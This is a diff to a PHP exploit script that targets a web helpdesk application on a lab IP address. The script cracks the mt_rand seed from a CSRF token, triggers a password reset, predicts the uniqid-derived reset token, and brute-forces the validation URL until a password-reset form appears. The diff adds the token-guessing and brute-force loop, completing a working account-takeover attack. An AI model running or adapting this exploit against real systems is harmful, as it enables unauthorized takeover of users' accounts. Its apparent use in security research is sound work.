@@ -79,7 +79,8 @@ function timeBetweenUniqid($url) {
             $prev_time = $time_dec;
         }
     }
-    return [min($times), max($times)];
+    sort($times);
+    return [$times[3], $times[count($times)-3]];
 }
 
 $base_url = 'http://172.16.122.131:8333';
@@ -88,6 +89,7 @@ $captcha_url = $base_url . "/index.php?/Base/Captcha/GetWordImage";
 $test_url = $base_url . '/test.php';
 $lost_pw_url = $base_url . "/index.php?/Base/UserLostPassword/Index";
 $lost_pw_post = $base_url . "/index.php?/Base/UserLostPassword/Submit";
+$validate_url = $base_url . "/index.php?/Base/UserLostPassword/Validate/";
 
 // Persistent curl object
 $curl = curl_init();
@@ -110,8 +112,8 @@ $hash = getCsrfHashFromPage($response);
 
 // Crack the seed of mt_rand
 list($seed, $time) = findSeed($hash, $start, $end);
-echo "mt_srand called " . ($time - $start). " seconds after call\n";
-die();
+$srand_called_time = $time - $start;
+echo "mt_srand called " . $srand_called_time . " seconds after call\n";
 
 // Retrieve page
 curl_setopt($curl, CURLOPT_URL, $lost_pw_url);
@@ -120,15 +122,56 @@ $response = curl_exec($curl);
 // Ask for reset password
 curl_setopt($curl, CURLOPT_URL, $lost_pw_post);
 curl_setopt($curl, CURLOPT_POSTFIELDS, 'email=some%40user.com');
-$start = uniqid();
+$start = microtime(true);
 $response = curl_exec($curl);
-$end = uniqid();
+$end = microtime(true);
 
 mt_srand($seed);
 for ($i = 0; $i < 42; $i++) {
     mt_rand();
 }
-echo BuildHash()."\n";
+$base_hash = BuildHash();
+echo $base_hash."\n";
+
+function combineHash($base, $u1, $u2, $u3, $u4) {
+    $usecs = [$u1, $u2, $u3, $u4];
+    $result = '';
+    for ($i = 0; $i < 4; $i++) {
+        $result .= substr($base, 8 * $i, 5);
+        $result .= usec_to_hashpart($usecs[$i]);
+    }
+    return $result;
+}
+
+list($min_time, $max_time) = timeBetweenUniqid($base_url);
+
+curl_setopt($curl, CURLOPT_POSTFIELDS, null);
+$usecs = ($start + $srand_called_time) * 1000000;
+for ($i = 1; $i < 50000; $i++) {
+    for ($usecs2 = $usecs + $min_time; $usecs2 < $usecs + $max_time; $usecs2++) {
+        for ($usecs3 = $usecs + $min_time; $usecs3 < $usecs + $max_time; $usecs3++) {
+            for ($usecs4 = $usecs + $min_time; $usecs4 < $usecs + $max_time; $usecs4++) {
+                $hash = combineHash($base_hash, $usecs, $usecs2, $usecs3, $usecs4);
+                printf("%s\n", $hash);
+
+                $url = $validate_url . $hash;
+                curl_setopt($curl, CURLOPT_URL, $url);
+                $response = curl_exec($curl);
+                if (strpos($response, 'Please enter your new password')) {
+                    die($url."\n");
+                }
+            }
+        }
+    }
+
+    if ($i % 2 == 0) {
+        $usecs -= $i;
+    } else {
+        $usecs += $i;
+    }
+}
+
+die();
 $mid = dechex((hexdec($end) - hexdec($start)) / 2 + hexdec($start));
 echo "$start $mid $end \n";
 
@@ -144,4 +187,22 @@ while (hexdec($current) <= hexdec($end)) {
 // $possible_time_chars = array_unique($possible_time_chars);
 // print_r($possible_time_chars);
 echo count($possible_time_chars);
+
+
+
+function usec_to_uniqid($usecs) {
+    $secs = $usecs / 1000000;
+    $usec = $usecs % 1000000;
+    return sprintf("%08x%05x", $secs, $usec);
+}
+
+function uniqid_to_hashpart($uniqid) {
+	$Ch6to8 = hexdec(substr($uniqid, -6)) % (36 * 36 * 36);
+	$chars = str_pad(base_convert($Ch6to8, 10, 36), 3, '0', STR_PAD_LEFT);
+    return $chars;
+}
+
+function usec_to_hashpart($usecs) {
+    return uniqid_to_hashpart(usec_to_uniqid($usecs));
+}
 
